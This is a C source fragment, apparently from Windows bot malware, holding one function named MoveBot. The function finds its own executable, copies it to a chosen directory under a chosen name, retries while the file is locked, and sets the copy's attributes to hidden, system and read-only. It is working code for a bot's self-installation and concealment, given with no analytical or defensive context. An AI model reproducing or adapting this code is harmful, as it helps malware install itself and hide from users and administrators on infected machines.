
BOOL MoveBot(char *MTP, char *Bname)
{
    char CurrentPath[MAX_PATH], CurrentPathF[MAX_PATH], MoveToPathF[MAX_PATH];
    HMODULE hModule = GetModuleHandle(NULL);
    if (hModule == NULL) {
        return FALSE;
    }
    GetModuleFileName(hModule, CurrentPathF, sizeof(CurrentPathF));
    _snprintf(MoveToPathF, sizeof(MoveToPathF), "%s\\%s", MTP, Bname);
    strcpy(CurrentPath, CurrentPathF);
    PathRemoveFileSpec(CurrentPath);
    char buf3[260], windir[260];
    GetWindowsDirectory(windir, sizeof(windir));
    hModule = NULL;
    GetModuleFileName(NULL, buf3, MAX_PATH);

    if (lstrcmpi(CurrentPathF, MoveToPathF))
    {
        DWORD attr = GetFileAttributes(MoveToPathF);
        if (attr != INVALID_FILE_ATTRIBUTES)
            SetFileAttributes(MoveToPathF, FILE_ATTRIBUTE_NORMAL);

        BOOL bCFRet = FALSE;
        while ((bCFRet = CopyFile(CurrentPathF, MoveToPathF, FALSE)) == FALSE)
        {
            DWORD result = GetLastError();
            if (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)
                Sleep(15000);
            else
                break;
        }

        SetFileAttributes(MoveToPathF, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

        return bCFRet;
    }

    return FALSE;
}
